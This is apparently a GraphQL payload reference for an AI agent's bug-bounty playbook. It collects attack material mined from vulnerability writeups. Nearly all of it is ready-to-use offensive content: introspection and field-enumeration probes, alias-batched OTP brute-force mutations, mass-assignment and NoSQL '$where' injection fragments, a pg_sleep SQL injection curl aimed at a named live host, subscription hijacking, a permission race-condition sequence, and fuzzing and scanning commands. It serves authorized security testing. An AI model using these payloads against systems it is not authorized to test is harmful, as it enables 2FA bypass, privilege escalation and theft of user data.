# Graphql — Combined Field Guide — Payload reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.

---

## Payloads & probes



- Introspection -> `{__schema{types{name fields{name}}}}`

- Alias abuse -> `{a:login(u:"a") b:login(u:"b")}`

- Mass assignment -> `mutation{updateUser(role:"admin"){id}}`

- Injection -> `filter: "{\"$where\":\"...\"}"`



## Payload fragments observed



Recurring payloads from this class's writeups. Adapt, don't paste blindly.



| Seen | Fragment |

|---:|---|

| 7× | `$where` |

| 2× | `\\| Decoded` |

| 2× | `{F_number_file}` |

| 2× | `curl 'https://gitlab.com/api/graphql' -H 'Accept: application/json' -H 'Content-Type: application/json' -H 'Authorization: Bearer <<TOKEN>>` |

| 1× | `sift(filter)` |

| 1× | `In CSP mode, sift does not support strings in "$where" condition` |

| 1× | `new Function("obj", "return " + myString)` |

| 1× | `next()` |

| 1× | `curl -sk 'https://hackerone.com/graphql' -H @/tmp/h1.headers -b "$COOKIE" \ / --data-raw '{"query":"{me{_id username}}"}' \\| jq` |

| 1× | `(empty) \\| HTTP 500 /` |

| 1× | `edges { cursor node { id } }` |

| 1× | `source: "doc[\"_seq_no\"].value` |

| 1× | `sort_query: '[{"id":"asc"}]` |

| 1× | `doc[\"_seq_no\"].value` |

| 1× | `doc['<field>'].value` |

| 1× | `curl -X POST http://localhost:8080/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(30\)%3B--%27` |

| 1× | `curl -X POST https://hackerone.com/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(30\)%3B--%27` |

| 1× | `{"data":{"team":{"_id":"██████████","report_sources":[]}}}` |

| 1× | `{"data":{"team":{"_id":"█████","report_sources":["HackerOne Platform"]}}}` |

| 1× | `{"data":{"team":{"_id":"█████████","report_sources":["HackerOne Platform"]}}}` |



## Parameters observed



`operation` · `ssl` · `type` · `embedded_submission_form_uuid` · `variables` · `document_type` · `name` · `sentry_key` · `access_level` · `core_hacker_username` · `core_team_handle` · `query` · `sort` · `page`



## Wordlists



Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.



| File | Entries |

|---|---:|

| `~/.local/share/hackerone-reports/wordlists/paths_graphql.txt` | 64 |

| `~/.local/share/hackerone-reports/wordlists/params_graphql.txt` | 14 |

| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |

| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |



```sh

W=~/.local/share/hackerone-reports/wordlists

ffuf -u https://target/FUZZ -w $W/paths_graphql.txt \

     -mc all -fc 404 -fs 0 -rate 40

ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_graphql.txt \

     -mr 'canary|error|invalid|not found' -rate 40

```



## Nuclei



Run introspection and authz tests by hand; templates mostly fingerprint servers and known CVEs.



```sh

nuclei -u https://target -tags graphql \

       -severity low,medium,high,critical -rl 40 -o nuclei_graphql.txt

nuclei -u https://target -t ~/nuclei-templates/http/technologies/graphql \

       -rl 40 -o nuclei_graphql_graphql.txt

nuclei -u https://target -t ~/nuclei-templates/http/vulnerabilities/other \

       -rl 40 -o nuclei_graphql_other.txt

# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'

```



Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.



## Payload & Detection Patterns



**Full Introspection Query:**

```graphql

{

  __schema {

    types {

      name

      fields {

        name

        type {

          name

          kind

        }

      }

    }

  }

}

```



**Minimal Introspection Probe (bypass attempt):**

```graphql

{ __typename }

```



**curl introspection test:**

```bash

curl -s -X POST https://target.com/graphql \

  -H "Content-Type: application/json" \

  -H "Authorization: Bearer YOUR_TOKEN" \

  -d '{"query":"{ __schema { queryType { name } } }"}' | jq .

```



**Field suggestion probe (bypass blind introspection blocks):**

```graphql

{ unknownField }

```

If response returns `"Did you mean: [realFieldName]?"` — schema is enumerable despite introspection being disabled.



**Batch query amplification:**

```json

[

  {"query": "{ user(id: 1) { email } }"},

  {"query": "{ user(id: 2) { email } }"},

  {"query": "{ user(id: 3) { email } }"}

]

```



**Subscription hijacking (cross-user channel access):**

```graphql

subscription { messageAdded(channelId: "OTHER_USERS_CHANNEL") { content sender { email } } }

```

If subscriptions lack per-user scoping, an attacker can receive real-time events from another user's channel or conversation.



**Multi-code OTP/2FA brute-force via alias batching:**

```graphql

mutation { 

  v1: verifyOtp(code:"000001"){token} 

  v2: verifyOtp(code:"000002"){token}

  v3: verifyOtp(code:"000003"){token}

}

```

A single GraphQL request aliases the same mutation with different OTP codes. Combined with parallel HTTP, this defeats per-request rate limiting and compresses brute-force attempts into fewer network round-trips.



**RC desync test pattern (pseudo-sequence):**

```bash

# Step 1: Grant access via REST

curl -X PUT https://api.target.com/repos/ORG/REPO/teams/TEAM \

  -H "Authorization: token ADMIN_TOKEN" \

  -d '{"permission":"admin"}'



# Step 2: Revoke via REST  

curl -X DELETE https://api.target.com/repos/ORG/REPO/teams/TEAM \

  -H "Authorization: token ADMIN_TOKEN"



# Step 3: Re-assert via GraphQL mutation

curl -X POST https://api.target.com/graphql \

  -H "Authorization: bearer ATTACKER_TOKEN" \

  -d '{"query":"mutation { updateTeamsRepository(input: {repositoryId: \"REPO_ID\", teamId: \"TEAM_ID\", permission: ADMIN}) { clientMutationId } }"}'



# Step 4: Verify persistent access

curl https://api.target.com/repos/ORG/REPO/teams \

  -H "Authorization: token ADMIN_TOKEN"

```



**Grep for GraphQL in JS bundles:**

```bash

grep -Eo '(query|mutation|subscription)\s+\w+\s*[\({]' bundle.js

grep -Eo '"(/[a-z0-9/_-]*graphql[a-z0-9/_-]*)"' bundle.js

```



**GraphQL introspection & audit tooling:**

```bash

# InQL (Burp extension) — visualize GraphQL schema and relationships

inql -t https://target/graphql --generate-queries



# Clairvoyance — brute-force field names when introspection is disabled

python3 clairvoyance.py -u https://target/graphql -H "Authorization: Bearer TOKEN" -w wordlist.txt -o schema.json



# GraphQL Cop — scan for common misconfigurations (introspection enabled, no depth limits, etc.)

graphql-cop -t https://target/graphql

```



---
